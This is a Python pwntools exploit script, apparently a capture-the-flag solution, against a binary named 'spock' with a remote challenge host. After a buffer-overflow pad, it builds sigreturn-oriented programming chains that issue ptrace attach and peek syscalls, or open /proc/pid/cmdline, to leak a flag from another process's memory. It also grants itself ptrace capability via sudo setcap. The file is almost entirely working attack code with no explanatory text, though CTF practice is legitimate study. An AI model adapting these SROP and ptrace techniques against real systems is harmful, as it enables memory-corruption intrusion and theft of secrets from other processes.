#!/usr/bin/python
from pwn import *
from os import system

context.update(
        arch="amd64",
        endian="little",
        log_level="debug",
        os="linux",
        terminal=["st"]
)


def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        b main
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote('mindmeld.martiansonly.net',31337)
    else:
        return process(binary)

def build_srop_chain(frame, exp):

    buffer = 0x404200
    syscall_ret = 0x40121c
    sigreturn_sys = 0x401219
    memory_size = 0x80

    if frame == None:
        return

    frame.rip = syscall_ret
    frame.rbp = buffer

    chain = b''
    log.info(f"Creating srop chain with {len(exp)} calls")

    for i in range(0, len(exp)):
        call = exp[i]

        rsp = buffer + memory_size + 256 * (i + 1)
        log.info(f"Rsp stack addr for {i} = {hex(rsp)}")

        frame.rsp = rsp
        frame.rax = call[0]
        frame.rdi = call[1]
        frame.rsi = call[2]
        frame.rdx = call[3]
        frame.r10 = call[4]

        chain +=  p64(sigreturn_sys) + bytes(frame)

    return chain


def exploit_orig(p,e):

    system("sudo setcap cap_sys_ptrace=ep $PWD/spock")
    p.recvuntil(b"Scotty's mental frequency is:")
    
    pid = int(p.recvline().strip(),10)
    log.info(f"Got processes pid {pid}")

    pad = b"A" * 24

    buffer = 0x404200
    syscall_ret = 0x40121c
    sigreturn_sys = 0x401219
    flag_heap_addr = 0x404050

    memory_size = 0x80
    frame_size = 248


    # Read Sigreturn
    rframe = SigreturnFrame(kernel='amd64')
    rframe.rsi = buffer 
    rframe.rdx = 0x1000
    rframe.rsp = buffer + memory_size
    rframe.rbp = buffer
    rframe.rip = syscall_ret

    # pop rax syscall
    chain = p64(sigreturn_sys) + bytes(rframe)
    
    p.recvuntil(b"Your thoughts to my thoughts >>> ")
    p.sendline(pad + chain)
    pause()
    

    chain2 = b"\x00" * 0x80 
 
    frame = SigreturnFrame(kernel='amd64')
    frame.rip = syscall_ret
    frame.rbp = buffer

    exp = [
            [0x65, 16, pid, 0, 0, 0], # ptrace(PTRACE_ATTACH, pid)
            [0x65, 2, pid, flag_heap_addr, buffer], # ptrace(PTRACE_PEEKDATA, pid, 0x404050, fake_stack)
            [1, 1, buffer, 8, 0, 0], # write(stdout, fake_stack, 8)
    ]

    rframe.rsi = buffer + memory_size
    chain2 += build_srop_chain(frame, exp)
    chain2 += p64(sigreturn_sys) + bytes(rframe)

    p.sendline(chain2)

    heap_addr = u64(p.recv(8))
    log.info(f"Leaked flag address on the heap: {hex(heap_addr)}")


    exp = [ 
        [0x65, 2, pid, heap_addr, buffer+0x10], # ptrace(PTRACE_PEEKDATA, pid, 0x404050, fake_stack)
        [0x65, 2, pid, heap_addr+8, buffer+0x18], # ptrace(PTRACE_PEEKDATA, pid, 0x404050, fake_stack)
        [0x65, 2, pid, heap_addr+0x10, buffer+0x20], # ptrace(PTRACE_PEEKDATA, pid, 0x404050, fake_stack)
        [0x65, 2, pid, heap_addr+0x18, buffer+0x28], # ptrace(PTRACE_PEEKDATA, pid, 0x404050, fake_stack)
        [0x65, 2, pid, heap_addr+0x20, buffer+0x30], # ptrace(PTRACE_PEEKDATA, pid, 0x404050, fake_stack)
        [0x65, 2, pid, heap_addr+0x28, buffer+0x38], # ptrace(PTRACE_PEEKDATA, pid, 0x404050, fake_stack)
        [1, 1, buffer+0x10, 0x30, 0, 0], # write(stdout, fake_stack, 8)
    ]

    pause()
    chain3 = build_srop_chain(frame, exp)

    p.sendline(chain3)
    p.interactive()


    
def exploit_cheese(p,e):
    p.recvuntil(b"Scotty's mental frequency is:")
    
    pid = int(p.recvline().strip(),10)
    log.info(f"Got processes pid {pid}")

    pad = b"A" * 24

    buffer = 0x404200
    syscall_ret = 0x40121c
    sigreturn_sys = 0x401219
    flag_heap_addr = 0x404050
    
    memory_size = 0x80
    
    # Read Sigreturn
    rframe = SigreturnFrame(kernel='amd64')
    rframe.rsi = buffer 
    rframe.rdx = 0x1000
    rframe.rsp = buffer + memory_size
    rframe.rbp = buffer
    rframe.rip = syscall_ret

    # pop rax syscall
    chain = p64(sigreturn_sys) + bytes(rframe)
    
    p.recvuntil(b"Your thoughts to my thoughts >>>")
    p.sendline(pad + chain)
    pause()

    chain2 = b"/proc/%d/cmdline" % pid 
    chain2 += b"\x00" * (0x80 - len(chain2))
 
    frame = SigreturnFrame(kernel='amd64')
    frame.rip = syscall_ret
    frame.rbp = buffer

    exp = [
            [2, buffer, 0, 0, 0],    # open("/proc/(pid)/cmdline")
            [0, 3, buffer + 0x30, 0x30, 0], # read(3, fake_stack, 0x30)
            [1, 1, buffer + 0x30, 0x30, 0] # write(1, fake_stack, 0x50)
    ]

    chain2 += build_srop_chain(frame, exp)

    # Read another rop chain with leak
    chain2 += p64(sigreturn_sys) + bytes(rframe)

    p.sendline(chain2)
    p.interactive()

    
if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)

    system("sudo setcap cap_sys_ptrace=ep $PWD/spock")
    exploit_orig(p,e)
    #exploit_cheese(p,e)
